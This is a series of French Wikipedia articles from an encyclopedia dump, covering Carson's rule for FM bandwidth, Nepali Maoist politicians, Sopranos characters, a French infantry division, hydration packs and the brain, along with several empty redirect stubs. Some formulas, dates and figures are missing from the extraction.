La règle de Carson, énoncée en 1922 par l'ingénieur d'AT&amp;T John R. Carson, permet d'évaluer la largeur de bande passante d'un signal modulé en fréquence.
Énoncé fondamental.
Dans le cas d'un signal modulant sinusoïdal, le signal modulé présente un spectre en raies (signal périodique).
En ne gardant alors que les raies contenant au moins 98 % de la puissance du signal modulé, on obtient l'expression:
avec 
Généralisation.
Par extension, dans le cas d'un signal modulant quelconque, en remplaçant formula_4 par la largeur de bande formula_6 du signal modulant et formula_3 par sa définition formula_8, formula_9 étant la déviation maximale de la fréquence instantanée
l'expression devient:
Cette expression est appelée règle de Carson. 
Portée de la règle de Carson.
C'est une règle fort pratique, mais qui reste une règle empirique dans le cas d'un signal modulant quelconque. 
Elle sous-estime en général la largeur de bande utile, c'est pourquoi elle est parfois modifiée:
Si l'indice de modulation formula_3 est fort, formula_14, la largeur de bande dépend alors essentiellement de l'amplitude du signal modulant.
Si l'indice de modulation formula_3 est faible, formula_16, la largeur de bande se rapproche de celle d'un signal modulé en amplitude.

</doc>
<doc id="3216173" url="https://fr.wikipedia.org/wiki?curid=3216173" title="Jong-Wook Lee (baseball)">
Jong-Wook Lee (baseball)



</doc>
<doc id="3216200" url="https://fr.wikipedia.org/wiki?curid=3216200" title="Ram Bahadur Thapa">
Ram Bahadur Thapa

Ram Bahadur Thapa, également connu sous le nom de guerre de « Badal », âgé d'environ 53 ans (en 2008), est un homme politique népalais, membre du Parti communiste du Népal (maoïste) (ou PCN-M).
Le , lors de l'élection de l'Assemblée constituante, il est élu député dans la du district de Chitwan.
Le , dans le cadre du programme minimal commun (en anglais : "" ou CMP) de gouvernement entre les maoïstes, les marxistes-léninistes et le Forum, il est nommé ministre de la Défense dans le gouvernement dirigé par Pushpa Kamal Dahal (alias « Prachanda »), lors de la première série de nominations et reçoit ses pouvoirs du Premier ministre, en présence du président de la République, Ram Baran Yadav.
Il ne doit pas être confondu avec un autre député maoïste, de quinze ans son cadet, Ram Bahadur Thapa Magar, également élu à l'Assemblée constituante, le , sur la liste nationale du PCN-M, dans le cadre du scrutin à la proportionnelle.

</doc>
<doc id="3216205" url="https://fr.wikipedia.org/wiki?curid=3216205" title="Benny Fazio">
Benny Fazio

Benito « Benny » Fazio, Jr., interprété par Max Casella, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il est soldat pour la Famille DiMeo.
Initialement associé de Christopher Moltisanti, Benny a commencé à travailler pour la Famille DiMeo avec Chris sous les ordres du "capo" Paulie Gualtieri et a ensuite travaillé sous les ordres de Chris après son élévation à la tête de l'équipe Soprano.

</doc>
<doc id="3216207" url="https://fr.wikipedia.org/wiki?curid=3216207" title="Prodige Namor">
Prodige Namor

 
Prodige Namor est un groupe de hip-hop français, originaire de Marseille, dans les Bouches-du-Rhône. Il est formé dans les années 1990 par Jean-Michel Steyer (Namor), et composé de Saïd Radjiabou, Maroco et DJ Majestic. Artiste tagueur et graffeur vétéran de la cité phocéenne, le rappeur Namor et son crew la Namomafia ont collaboré de nombreuses fois avec le groupe Assassin. Prodige Namor se sépare en 2000.
Biographie.
Prodige Namor est formé au milieu des années 1990 à Marseille, dans les Bouches-du-Rhône, par le rappeur Namor, ancien membre de Hardcore MC. Après un premier maxi 45 tours autoproduit intitulé "Bienvenue dans le traquenard" et paru en 1997, le groupe publie son premier album, "L'heure de vérité", produit par Crépuscule France et distribué le par le label indépendant PIAS. Sur ce premier long format réalisé à Marseille par les producteurs Mounir Belkhir, Time Bomb et Yvan de Double Pact, des rappeurs comme Mystik, Faf Larage et Freeman participent à des interludes-concept. D'autres, comme Stress du groupe Double Pact de Lausanne, Soprano des Psy 4 de la rime, Rockin' Squat d'Assassin, ou encore Kery James d'Ideal J, participent en featuring.
Prodige Namor se sépare de manière informelle en 2000, à la suite de quoi Namor se consacre pleinement aux ateliers d'écriture qu'il réalise depuis 1998 à la Friche Belle de Mai. Il formera ensuite le collectif Al Iman Staff, aux côtés de Comodo, Tom Parker, Natch, Maroco et Mesrime en produisant notamment l'album "Mets les gosses à l'abri" paru en 2005 sur son label Artistreet et distribué par Night &amp; Day. Saïd Radjiabou rejoint de son côté le groupe IAM pour participer aux "backs" et aux performances live en concert.

</doc>
<doc id="3216225" url="https://fr.wikipedia.org/wiki?curid=3216225" title="Thrill Seeker">
Thrill Seeker



</doc>
<doc id="3216226" url="https://fr.wikipedia.org/wiki?curid=3216226" title="Révolte des Moros">
Révolte des Moros



</doc>
<doc id="3216227" url="https://fr.wikipedia.org/wiki?curid=3216227" title="Beauvoisine">
Beauvoisine



</doc>
<doc id="3216242" url="https://fr.wikipedia.org/wiki?curid=3216242" title="Phil Leotardo">
Phil Leotardo

Philip « Phil » Leotardo, interprété par Frank Vincent, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il apparait dans la saison 5 où il est libéré après 20 ans de prison. À l'origine il est capitaine ou "capo" dans la famille Lupertazzi. Puis, à la mort de Carmine Lupertazzi, à la suite de l'emprisonnement et mort du successeur de ce dernier, Johnny Sack et une brève lutte de pouvoir interne avec Faustino Santoro dit "Doc", il devient le parrain de la Famille de New York. Son incapacité à pardonner la mort de son frère des mains du cousin de Tony, Tony Blundetto, même après le meurtre de ce dernier effectué par Tony, constitue l'une des trames narratives centrales de la série, Leotardo ayant pour objectif de tuer Tony et de paralyser toute son organisation pour venger la mort de son frère. Phil est marié à Patty Leotardo et un cousin au second degrés de Mari Spatafore. Phil a une forte ressemblance avec le dernier Shah d'Iran, Reza Pahlavi, menant Tony Soprano et les autres membres de la famille DiMeo à le surnommer le "Shah". Il habite à Kensington, à Brooklyn. Leotardo révèle durant la saison six que lorsque son grand-père a immigré de Sicile, l'administration d'Ellis Island a changé son nom de Leonardo en Leotardo et qu'il serait un descendant de Leonard de Vinci. 
Son père s'appelait Francis, ainsi que son petit-fils. Il dit à Nancy Sinatra qu'il était à Las Vegas, dans le Nevada, et qu'il a vu son père, Frank Sinatra, aider à raviver l'amitié entre Dean Martin et Jerry Lewis au "Téléthon de la fête du travail de la MDA de Jerry Lewis" en 1976 dans un casino de Las Vegas .
Biographie.
Né le 11 avril 1941, il est un membre important et un caporegime de longue date de la famille Lupertazzi. Phil est un des "affranchis" qui est envoyé en prison durant "l'effondrement de la mafia dans les années 1980" et après avoir effectué 20 ans en détention, il est relâché dans ce qui est surnommé comme "la classe de 2004" au début de la saison 5. Phil a toujours bien effectué son travail avec un total de 27 assassinats à son actif. Une fois qu'il est relâché de prison, il rejoint rapidement la famille Lupertazzi de Brooklyn à New-York. 
Phil avait un pourcentage dans un circuit de voitures miniatures avec comme associés Johnny Soprano et Hesh Rabkin. Quand Tony Soprano apprend que Hesh a gardé la part de Johnny pour lui-même au lieu de la donner à la maîtresse de Johnny, Fran Felstein. Il demande à Johnny Sack un entretien pour clarifier la situation. Tony demande que Phil paye 25% sur sa part. Phil estime que cela avoisine autour de 40 000 $. Phil se met en colère contre Tony en disant qu'il "a des couilles, ce petit", Feech La Manna le considère lui-aussi comme un gamin. Bien que Johnny Sack et Silvio tentent de calmer la situation, Tony se met lui aussi en colère et répond à Phil que "ce ne sont pas les années 1970 et que je ne suis pas un enfant", il exige le paiement sous cinq jours et quitte la table des négociations. Johnny Sack reproche à Phil de manquer de respect à Tony et lui rappelle que "Tony est parrain". Phil lui rétorque, tout comme Carmine Lupertazzi , il ne considére pas la famille DiMeo comme une vraie famille de la mafia et que, par conséquent, il ne considère pas leur chef comme un parrain. À la sortie de la réunion, Phil et Tony se prennent en chasse en voiture l'un l'autre. Phil tente d'éviter Tony, il est forcé de quitter la route, s'écrase contre un camion garé et se blesse au cou. Il doit porter une minerve pour les prochaines semaines. Tony décide d'indemniser Phil en faisant réparer sa voiture au Body Shop des frères Bonpensiero, tenu par la femme de Pussy Bonpensiero. Phil, de mauvaise foi, fait en sorte de faire gonfler le devis des réparations.
Suivant la mort de Carmine Sr, une lutte fratricide s'engage entre deux factions. D'un côté, celle menait par le sous-boss de Carmine, Johnny Sack, tandis que l'autre est mené par le seul fils de Carmine et caporegime de Miami "Little Carmine" Luppertazzi, bien que dans les faits, elle est dirigée en sous-main par le consigliere Angelo Garepe et le caporegime Rusty Millio. "Little Carmine" est une sorte de pantin entre leurs mains. C'est lui, avec l'aide de son frère, qui assassinera Garepe après le meurtre de "Joey Peeps". Cette assassinat entraînera ainsi la mort de son frère aux mains d'un ami de Garepe, Tony Blundetto, cousin de Tony Soprano. 
Caché avec sa femme et ses deux petits-enfants, il fut tué d'une balle dans la tête dans une station service, à la suite d'un accord passé entre sa propre équipe et Tony Soprano, permettant ainsi la fin de la guerre entre les deux familles.

</doc>
<doc id="3216245" url="https://fr.wikipedia.org/wiki?curid=3216245" title="Bobby Baccala">
Bobby Baccala



</doc>
<doc id="3216247" url="https://fr.wikipedia.org/wiki?curid=3216247" title="JchatIRC">
JchatIRC



</doc>
<doc id="3216272" url="https://fr.wikipedia.org/wiki?curid=3216272" title="Jennifer Melfi">
Jennifer Melfi

Dr. Jennifer Melfi, M.D., interprétée par Lorraine Bracco, est un personnage fictif de la série télévisée d'HBO "Les Soprano".
Elle est la psychiatre de Tony Soprano.
Biographie.
Jennifer Melfi vient d'une famille aisée, originaire de Caserte. Elle est diplômée de l'université Tufts.
Son ex-mari, Richard LaPenna, gère une association pour défendre une représentation plus favorable des Italo-américains. Leur fils, Jason, étudie à Bard College et doute sur son orientation professionnelle.
Son personnage représente une autre facette de la communauté italo-américaine, plus en phase avec la société américaine actuelle, par opposition au repli communautaire représenté par Tony Soprano et ses associés.
Dévouée à son travail, le Dr. Melfi tente d'aider son patient au maximum de ses capacités, et ce en dépit du comportement souvent irrespectueux qu'il peut avoir à son égard, ou des mises en garde de son entourage. Au fil des saisons, elle noue avec Tony une relation particulière, alternant des périodes de fascination, de séduction et de répulsion. Celle-ci met régulièrement son professionnalisme, voire sa santé mentale, à rude épreuve.
De tous les personnages de la série, elle est probablement celle qui parvient le mieux à le cerner.
Le Dr. Melfi est elle-même suivie par un psychiatre, le Dr. Eliott Kupferberg.

</doc>
<doc id="3216287" url="https://fr.wikipedia.org/wiki?curid=3216287" title="26e division d'infanterie (France)">
26e division d'infanterie (France)

La d'infanterie est une division d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale et à la Seconde Guerre mondiale. Elle est recréée brièvement au Maroc en 1956-1958 en Algérie en 1962-1963.
Avant 1914.
La division est créée par le décret du. Située en région militaire (Clermont-Ferrand), elle a son état-major au Puy-en-Velay et est constituée de deux brigades :
La division est en 1874 à Clermont-Ferrand, avec la brigade à Saint-Étienne et la détachée en garnison à Lyon. Dès 1875, la division et la sont à Saint-Étienne et la à Roanne.
En 1914 : ( et ) à Riom, ( et ) à Clermont.
Première Guerre mondiale.
Composition au cours de la guerre.
Mobilisée dans la Région, la division appartient au d'armée, au sein de la française.
Décorations et citations.
Le 8 décembre, le général Alix porte à la connaissance de ses troupes, la citation adressé à la d'infanterie : 
L'entre-deux-guerres.
En garnison à Clermont-Ferrand après guerre, la division est constituée en 1920 des régiments suivants :
Elle est dissoute le .
Seconde Guerre mondiale.
Composition.
La division est reformée le , comme division d'infanterie de réserve série A.
Le la DI, sous les ordres du général Bonnassieux, est rattachée au corps d'armée qui est intégré à la armée.
À cette date la division d'infanterie se compose de :
Après 1945.
Maroc 1956-1958.
La division est recréée au Maroc le 16 octobre 1956, à partir de la division de Fès. Elle stationnée à Fès puis déménage à Meknès le .
Elle est dissoute le 30 septembre 1958.
Algérie 1962-1963.
La d'infanterie est recréée en juillet 1962 à partir du commandement territorial du Sahara, avec un poste de commandement à Reggane. Devenue le , elle est constituée de deux brigades, la à Colomb-Béchar à et la à Ouargla.
La est dissoute le . La est rattachée à la (ex-corps d'armée d'Oran) et la à la (ex-corps d'armée d'Alger).
Insigne.
Homologué G.1375 en 1957 : étoile marocaine chargée en cœur d'une vue de la ville de Fès (dominée par un minaret).

</doc>
<doc id="3216310" url="https://fr.wikipedia.org/wiki?curid=3216310" title="Messengers">
Messengers

Messengers est un film réalisé par Philip Farha, sorti en 2004.

</doc>
<doc id="3216316" url="https://fr.wikipedia.org/wiki?curid=3216316" title="Cherokee">
Cherokee



</doc>
<doc id="3216318" url="https://fr.wikipedia.org/wiki?curid=3216318" title="Librairie graphique">
Librairie graphique



</doc>
<doc id="3216319" url="https://fr.wikipedia.org/wiki?curid=3216319" title="Bar Kohkba Sextet">
Bar Kohkba Sextet



</doc>
<doc id="3216326" url="https://fr.wikipedia.org/wiki?curid=3216326" title="Angela's Ashes">
Angela's Ashes



</doc>
<doc id="3216328" url="https://fr.wikipedia.org/wiki?curid=3216328" title="Mont du Borgne">
Mont du Borgne

Le mont du Borgne est un sommet situé dans le massif de la Vanoise, en Savoie, dans la région Auvergne-Rhône-Alpes.
Géographie.
Le mont du Borgne est un sommet de d'altitude aux frontières de la vallée des Belleville et de la commune de Saint-Martin-de-Belleville, au-dessus de la station de Val Thorens, et de Méribel les Allues. Il est situé à la limite du parc national de la Vanoise, au nord de l'aiguille de Péclet et au sud de l'aiguille du Fruit.
Il y a aussi à proximité l'aiguille du Borgne à et la pointe du Borgne à .
Accès.
On peut accéder au mont du Borgne à partir de Val Thorens sur la commune de Saint-Martin-de-Belleville, dans la vallée des Belleville.

</doc>
<doc id="3216329" url="https://fr.wikipedia.org/wiki?curid=3216329" title="Parc de Fleury Sur Orne">
Parc de Fleury Sur Orne



</doc>
<doc id="3216339" url="https://fr.wikipedia.org/wiki?curid=3216339" title="FAR Manager">
FAR Manager



</doc>
<doc id="3216340" url="https://fr.wikipedia.org/wiki?curid=3216340" title="Table de caractères">
Table de caractères

La table de caractères ( et CharMap.exe ) est un utilitaire inclus dans les systèmes d'exploitation Linux (comme Ubuntu) et Microsoft Windows. Il est utilisé pour afficher les caractères dans n'importe quelle police installée, pour vérifier ce que le clavier (Alt) est utilisé pour saisir les caractères, et à copier les caractères à presse-papiers au lieu de la frappe. L'outil est généralement utile pour entrer des caractères spéciaux. 
La case à cocher "Affichage avancé" peut être utilisée pour inspecter les jeux de caractères dans une police de caractère en fonction de différents encodages (pages de code), y compris les gammes de code Unicode, notamment pour localiser les caractères Unicode par leur point de code ou par leur nom. Pour les polices de caractères Unicode, les caractères peuvent être regroupés par leur rangée Unicode (subrange).

</doc>
<doc id="3216342" url="https://fr.wikipedia.org/wiki?curid=3216342" title="Sac à eau">
Sac à eau

Un sac à eau, aussi appelé sac-gourde ou sac-réservoir, ou encore outre dorsale, est un type de sac à dos (ou plus rarement, de sac à la taille) contenant un réservoir souple rempli d'eau (ou de toute autre boisson) et équipé d'un tuyau flexible sortant du sac pour être maintenu à portée de la bouche de l'utilisateur, de manière qu'il puisse s'en servir à tout moment comme d'une paille. Ce dispositif, utilisé comme une alternative à la gourde, a l'avantage de permettre à l'utilisateur de s'hydrater tout en gardant les mains libres, sans être gêné pour continuer son activité.
Il trouve ainsi son utilité dans les sports et les loisirs en extérieur (notamment pour le cyclisme, la course à pied (comme en trail), le canoë-kayak, le ski, la randonnée pédestre, le parapente, le vol à voile, le roller, la moto et la chasse), mais aussi auprès des soldats et des forces de l'ordre lors d'opérations de longue durée.
Description.
La forme adoptée par les sacs à eau varie d'un modèle à l'autre, selon les usages que l'on souhaite en faire. Ainsi certains d'entre eux, conçus pour ne contenir rien d'autre que le réservoir, sont très compacts et légers, tandis que d'autres, à l'instar de n'importe quel autre sac à dos, contiennent des poches additionnelles en nombre et en capacité variables, et sont par conséquent plus volumineux et encombrants.
Le réservoir est fait de caoutchouc ou de plastique. En plus du tuyau, il est équipé d'une seconde ouverture, plus large, fermée par un bouchon, permettant de le remplir. Il est généralement dissocié du sac, et d'ailleurs il faut souvent l'en sortir pour pouvoir le remplir. Sa contenance est habituellement comprise entre . Il est parfois isolé thermiquement pour empêcher le liquide de geler ou de chauffer.
Le tuyau sort généralement du sac par la partie supérieure, et arrive à portée de la bouche de l'utilisateur en passant par-dessus son épaule, souvent en étant fixé le long d'une des bretelles du sac. À l'autre extrémité, il se termine par une valve, laquelle doit généralement être mordue pour que le liquide puisse passer, avant d'être aspiré par l'utilisateur. Certaines valves sont aussi équipées de capuchons pour les protéger des saletés telles que la terre, la boue, le sable ou la poussière, qui sont susceptibles de venir s'y projeter au cours des activités pour lesquelles les sacs à eau sont conçus.
Bénéfices.
Pour les activités sportives, ce système évite de devoir sortir une gourde d'un sac et s'arrêter pour boire. Ainsi le sportif ne casse pas son rythme (particulièrement pour les courses d'endurance ou la randonnée).
Pour les militaires, il permet de gagner du temps et évite une perte d'attention. La poche à eau est particulièrement prisée des tireurs d'élite, qui doivent souvent surveiller pendant longtemps une scène, en bougeant le moins possible pour rester invisibles.
Les VTTistes s'hydratent davantage lorsqu'ils sont équipés d'un sac à eau, du fait de l'aspect pratique du système, ce qui permet d'éviter les déshydratations.
Entretien.
Un manque d'entretien des parties en contact avec le liquide peut avoir comme conséquence le développement de bactéries.
Il existe dans le commerce des kits prévus pour faciliter cette tâche. Ils contiennent généralement des goupillons de tailles et de formes adaptées, pour les uns, au réservoir, et pour les autres, au tuyau, ainsi que des tablettes nettoyantes conçues pour se dissoudre dans un réservoir rempli d'eau ; ou encore des pièces permettant de suspendre le réservoir et de le maintenir ouvert, ce qui facilite le séchage et évite les moisissures.
CamelBak.
Dans le langage courant, la marque ', fondée dans les années , est spécialisée dans les sacs à eau et se présentant comme pionnière et leader dans ce domaine. Elle reste souvent utilisée de manière générique pour désigner tout produit de ce type, même s'il est de marque différente ; elle vient de l'anglais « ' », qui désigne le dos, et « "" », qui désigne le chameau, faisant ainsi un parallèle avec les bosses de cet animal, réputées contenir suffisamment d'eau pour lui garantir une grande autonomie (en fait, de l'énergie sous forme de graisse). Il existe cependant de nombreuses autres marques fabriquant de tels produits ; à l'inverse, d'autres types de produits peuvent être étiquetés CamelBak, la marque s'étant récemment diversifiée, avec par exemple des bouteilles en polycarbonates, des gants, et divers autres équipements de transport et de rangement à usage tactique.

</doc>
<doc id="3216344" url="https://fr.wikipedia.org/wiki?curid=3216344" title="Sac-gourde">
Sac-gourde



</doc>
<doc id="3216345" url="https://fr.wikipedia.org/wiki?curid=3216345" title="Sac gourde">
Sac gourde



</doc>
<doc id="3216346" url="https://fr.wikipedia.org/wiki?curid=3216346" title="Sac réservoir">
Sac réservoir



</doc>
<doc id="3216347" url="https://fr.wikipedia.org/wiki?curid=3216347" title="Sac-réservoir">
Sac-réservoir



</doc>
<doc id="3216349" url="https://fr.wikipedia.org/wiki?curid=3216349" title="Camel Bak">
Camel Bak



</doc>
<doc id="3216352" url="https://fr.wikipedia.org/wiki?curid=3216352" title="Camel Back">
Camel Back



</doc>
<doc id="3216353" url="https://fr.wikipedia.org/wiki?curid=3216353" title="CamelBack">
CamelBack



</doc>
<doc id="3216355" url="https://fr.wikipedia.org/wiki?curid=3216355" title="Camel bak">
Camel bak



</doc>
<doc id="3216356" url="https://fr.wikipedia.org/wiki?curid=3216356" title="Hesh Rabkin">
Hesh Rabkin

Herman « Hesh » Rabkin, interprété par Jerry Adler, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il est un des conseillers et ami de Tony Soprano. 
Le personnage de Hesh Rabkin est un personnage inspiré de plusieurs personnes réelles. Il est inspiré par Morris Levy dit "Mo", le producteur et le fondateur de Roulette Records, qui avait des liens avec la mafia et qui possédait un haras de chevaux de course, Hy Weiss (un associé de Levy) et de Gaetano Vastola dit "Corky" qui était membre de la mafia du New Jersey et travaillait avec Roulette Records. 
Biographie.
Vieil associé et ami juif de la famille DiMeo, il n'est pas italien mais cela ne l'empêche pas de prendre part à diverses combines et à pouvoir compter le cas échéant sur le soutien de Tony. Cultivé et très expérimenté, il est aussi son conseiller informel.

</doc>
<doc id="3216357" url="https://fr.wikipedia.org/wiki?curid=3216357" title="Camel back">
Camel back



</doc>
<doc id="3216358" url="https://fr.wikipedia.org/wiki?curid=3216358" title="Camelback">
Camelback

Camelback est le nom anglais qui signifie sac à eau.

</doc>
<doc id="3216359" url="https://fr.wikipedia.org/wiki?curid=3216359" title="Dev Gurung">
Dev Gurung

Dev Gurung, de son nom complet Dev Prasad Gurung – en népalais : –, âgé d'environ 51 ans (en 2008), est un homme politique népalais, cadre dirigeant du Parti communiste du Népal (maoïste) (ou PCN-M).
Le , il intègre le cabinet intérimaire dirigé par Girija Prasad Koirala, par ailleurs président du parti Congrès népalais, avec les fonctions de ministre du Développement local. Comme ses collègues maoïstes, il quitte temporairement le cabinet, de septembre à , en raison de différends avec le Premier ministre. Il occupe de nouveau les mêmes fonctions, de au , date de la démission formelle du Premier ministre après l'installation de l'Assemblée constituante et l'élection du président de la République.
Le , lors de l'élection de l'Assemblée constituante, il est élu député dans la du district de Manang.
Le , dans le cadre du programme minimal commun (en anglais : "" ou CMP) de gouvernement entre les maoïstes, les marxistes-léninistes et le Forum, il est nommé ministre de la Loi, de la Justice et de l'Assemblée constituante dans le gouvernement dirigé par Pushpa Kamal Dahal (alias « Prachanda »), lors de la première série de nominations et reçoit ses pouvoirs du Premier ministre, en présence du président de la République, Ram Baran Yadav. Il succède, dans ces fonctions, à Narendra Bikram Nemwang, membre du Congrès népalais, dont l'intitulé du portefeuille était légèrement différent : ministre de la Loi, de la Justice et des Affaires parlementaires.
Le suivant, dans le cadre de la seconde série de nominations au sein du cabinet, il est remplacé, dans ses anciennes fonctions de ministre du Développement local, par Ram Chandra Jha, membre du PCN-MLU.

</doc>
<doc id="3216360" url="https://fr.wikipedia.org/wiki?curid=3216360" title="Hydrapak">
Hydrapak



</doc>
<doc id="3216361" url="https://fr.wikipedia.org/wiki?curid=3216361" title="Gnome commander">
Gnome commander



</doc>
<doc id="3216363" url="https://fr.wikipedia.org/wiki?curid=3216363" title="Sac à la taille">
Sac à la taille



</doc>
<doc id="3216364" url="https://fr.wikipedia.org/wiki?curid=3216364" title="Sac à taille">
Sac à taille



</doc>
<doc id="3216366" url="https://fr.wikipedia.org/wiki?curid=3216366" title="Sacoche de ceinture">
Sacoche de ceinture



</doc>
<doc id="3216369" url="https://fr.wikipedia.org/wiki?curid=3216369" title="Artie Bucco">
Artie Bucco

Arthur « Artie » Bucco, Jr., interprété par John Ventimiglia, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il est restaurateur et ami d'enfance de Tony Soprano.
Ami depuis l'enfance de Tony, Artie tient un restaurant italien fréquenté par l'équipe du boss du New Jersey. Il ne trempe pas dans les affaires de la mafia mais doit vivre avec eux, parfois à son détriment. 

</doc>
<doc id="3216408" url="https://fr.wikipedia.org/wiki?curid=3216408" title="Le Tueur">
Le Tueur

Le Tueur peut désigner :

</doc>
<doc id="3216411" url="https://fr.wikipedia.org/wiki?curid=3216411" title="Charmaine Bucco">
Charmaine Bucco

Charmaine Bucco, interprétée par Kathrine Narducci, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Elle est la femme d'Artie Bucco et une amie d'enfance de Carmela et Tony Soprano.
Charmaine ne supporte pas les « fréquentations » de son mari ce qui engendre de nombreuses disputes et un mariage tumultueux.

</doc>
<doc id="3216419" url="https://fr.wikipedia.org/wiki?curid=3216419" title="Blonde redhead">
Blonde redhead



</doc>
<doc id="3216490" url="https://fr.wikipedia.org/wiki?curid=3216490" title="Cerveau">
Cerveau

Le cerveau est le principal organe du système nerveux des animaux bilatériens. Ce terme tient du langage courant (non scientifique) et chez les chordés, comme les humains, il peut désigner l'encéphale, ou uniquement une partie de l'encéphale, le prosencéphale (télencéphale + diencéphale), voire seulement le télencéphale. Néanmoins, dans cet article, le terme « cerveau » prend son sens le plus large.
Le cerveau des chordés est situé dans la tête, protégé par le crâne chez les craniés, et son volume varie grandement d'une espèce à l'autre. Pour les animaux d'autres embranchements, certains centres nerveux sont également appelés cerveau par analogie avec les chordés.
Le cerveau régule les autres systèmes d'organes du corps, en agissant sur les muscles ou les glandes, et constitue le siège des fonctions cognitives. Ce contrôle centralisé de l'organisme permet des réponses rapides et coordonnées aux variations environnementales. Les réflexes, schémas de réponses simples, ne nécessitent pas l'intervention du cerveau. Toutefois, les comportements plus sophistiqués nécessitent que le cerveau intègre les informations transmises par les systèmes sensoriels et fournisse une réponse adaptée.
L'encéphale est une structure extrêmement complexe qui peut renfermer jusqu'à plusieurs milliards de neurones connectés les uns aux autres. Les neurones sont les cellules cérébrales qui communiquent entre elles par le biais de longues fibres protoplasmiques appelées axones. L'axone d'un neurone transmet des influx nerveux, les potentiels d'action, à des cellules cibles spécifiques situées dans des régions plus ou moins distantes du cerveau ou de l'organisme. Les cellules gliales sont le deuxième type cellulaire du cerveau et assurent des fonctions très diversifiées, centrées autour du support des neurones et de leurs fonctions. Bien que les cellules gliales et les neurones aient probablement été observés pour la première fois en même temps au début du , contrairement aux neurones dont les propriétés morphologiques et physiologiques étaient directement observables pour les premiers investigateurs du système nerveux, les cellules gliales étaient considérées, jusqu'au milieu du , simplement comme de la « glu » qui « colle » les neurones ensemble.
Malgré de grandes avancées en neurosciences, le fonctionnement du cerveau est encore mal connu. Les relations qu'il entretient avec l'esprit sont le sujet de nombreuses discussions, aussi bien philosophiques que scientifiques.
Depuis son origine, la recherche sur le cerveau a connu principalement trois phases : phase philosophique, phase expérimentale et phase théorique. Pour le futur des neurosciences, certains auteurs prédisent une phase de simulation.
Anatomie.
Le cerveau est la structure biologique la plus complexe connue ce qui rend souvent délicate la comparaison de cerveaux de différentes espèces à partir de leur apparence. Néanmoins, l'architecture du cerveau présente plusieurs caractéristiques communes à un grand nombre d'espèces. Trois approches complémentaires permettent de les mettre en évidence. L'approche évolutionniste compare l'anatomie du cerveau entre différentes espèces et repose sur le principe que les caractères retrouvés sur toutes les branches descendantes d'un ancêtre donné étaient aussi présentes chez leur ancêtre commun. L'approche développementale étudie le processus de formation du cerveau du stade embryonnaire au stade adulte. Enfin, l'approche génétique analyse l'expression des gènes dans les différentes zones du cerveau.
L'origine du cerveau remonte à l'apparition des bilatériens, une des principales subdivisions du règne animal notamment caractérisée par une symétrie bilatérale des organismes, il y a environ 550- d'années. L'ancêtre commun de ce taxon suivait un plan d'organisation de type tubulaire, vermiforme et métamérisé ; un schéma qui continue de se retrouver dans le corps de tous les bilatériens actuels, dont les humains. Ce plan d'organisation fondamental du corps est un tube renfermant un tube digestif, reliant la bouche et l'anus, et un cordon nerveux qui porte un ganglion au niveau de chaque métamère du corps et notamment un ganglion plus important au niveau du front appelé « cerveau ».
Protostomiens.
La composition du cerveau des protostomiens est très différente de celle des chordés (qui sont épineuriens), à tel point qu'il est difficile de comparer les deux structures sauf à se baser sur la génétique. Beaucoup de protostomiens sont hyponeuriens ; deux groupes s'en démarquent par un cerveau relativement complexe : les arthropodes et les céphalopodes. Le cerveau de ces deux groupes provient de deux cordons nerveux parallèles qui s'étendent à travers tout le corps de l'animal. Les arthropodes ont un cerveau central avec trois divisions et de larges lobes optiques derrière chaque œil pour le traitement visuel. Les céphalopodes possèdent le plus gros cerveau de tous les protostomiens. Celui des pieuvres est très développé, avec une complexité similaire à celle rencontrée chez les chordés, ce qui permet aux pieuvres de développer des capacités cognitives comme la possibilité d'utiliser un outil.
Le cerveau de quelques hyponeuriens a été particulièrement étudié. Par la simplicité et l'accessibilité de son système nerveux, l'aplysie (un mollusque) a été choisie comme modèle par le neurophysiologiste Eric Kandel pour l'étude des bases moléculaires de la mémoire qui lui valut un prix Nobel en 2000. Cependant, le cerveau d'hyponeurien le plus étudié demeure celui de la drosophile (un arthropode). Du fait de l'important panel de techniques à disposition pour étudier leur matériel génétique, les drosophiles sont tout naturellement devenues un sujet d'étude sur le rôle des gènes dans le développement du cerveau. De nombreux aspects de la neurogénétique des drosophiles se sont avérés être également valables chez l'humain. Par exemple, les premiers gènes impliqués dans l'horloge biologique furent identifiés dans les années 1970 en étudiant des drosophiles mutantes montrant des perturbations dans leur cycle journalier d'activité. Une recherche sur le génome des chordés a montré un ensemble de gènes analogues à ceux de la drosophile jouant un rôle similaire dans l'horloge biologique de la souris et probablement également chez l'humain.
Un autre protostomien, le ver nématode "Caenorhabditis elegans", a fait l'objet, comme la drosophile, d'études génétiques approfondies car son plan d'organisation est très stéréotypé : le système nerveux du morphe hermaphrodite possède exactement , toujours à la même place, établissant les mêmes liaisons synaptiques pour chaque ver. Au début des années 1970, du fait de sa simplicité et de sa facilité d’élevage, Sydney Brenner le choisit comme organisme modèle pour ses travaux sur le processus de régulation génétique du développement qui lui valurent un prix Nobel en 2002. Pour ses travaux, Brenner et son équipe ont découpé les vers en milliers de sections ultra fines et photographié chacune d'entre elles au microscope électronique afin de visualiser les fibres assorties à chaque section et ainsi planifier chaque neurone et chaque synapse dans le corps du ver. Actuellement, un tel niveau de détail n'est disponible pour aucun autre organisme, et les informations récoltées ont rendu possibles de nombreuses études.
Chordés.
L'embranchement des chordés, auquel appartiennent les humains, est apparu lors de l'explosion cambrienne.
Le cerveau de l'ensemble des chordés présente fondamentalement la même structure. Il est constitué d'un tissu mou d'une texture gélatineuse. De manière générale, le tissu cérébral vivant est rosâtre à l'extérieur et blanchâtre à l'intérieur. Le cerveau des chordés est enveloppé d'un système membranaire de tissu conjonctif, les méninges, qui sépare le crâne du cerveau. De l'extérieur vers l'intérieur, les méninges sont composées de trois membranes : la dure-mère, l'arachnoïde et la pie-mère. L'arachnoïde et la pie-mère sont étroitement connectées entre elles et peuvent ainsi être considérées comme une seule et même couche, la pie-arachnoïde. Compris entre l'arachnoïde et la pie mère, l'espace sous-arachnoïdien contient le liquide cérébro-spinal qui circule dans l'étroit espace entre les cellules et à travers les cavités appelées système ventriculaire. Ce liquide sert notamment de protection mécanique au cerveau en absorbant et amortissant les chocs et à transporter hormones et nutriments vers le tissu cérébral. Les vaisseaux sanguins viennent irriguer le système nerveux central à travers l'espace périvasculaire au-dessus de la pie-mère. Au niveau des vaisseaux sanguins, les cellules 